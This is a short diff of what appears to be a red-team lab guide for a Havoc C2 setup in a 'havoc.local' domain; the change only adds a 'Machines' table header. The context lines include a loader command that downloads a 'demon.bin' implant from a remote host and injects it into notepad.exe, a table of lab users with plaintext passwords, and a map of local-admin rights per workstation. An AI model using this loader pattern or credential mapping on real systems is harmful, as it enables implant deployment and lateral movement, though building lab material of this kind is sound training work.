@@ -555,7 +555,7 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 | Aaron          | Tarolli       | a.tarolli    | `Password123!`       | Sales | * |
 | Zane           | Dickens       | z.dickens    | `M0t0rH3Ad65^$#`     | Sales |   |
 
-|                            | Local Admin  | Domain Users       |
+| Machines                   | Local Admin  | Domain Users       |
 |----------------------------|--------------|--------------------|
 | WORKSTATION-01.havoc.local | s.chisholm   | m.seitz, a.tarolli |
 | WORKSTATION-02.havoc.local | m.seitz      |                    |
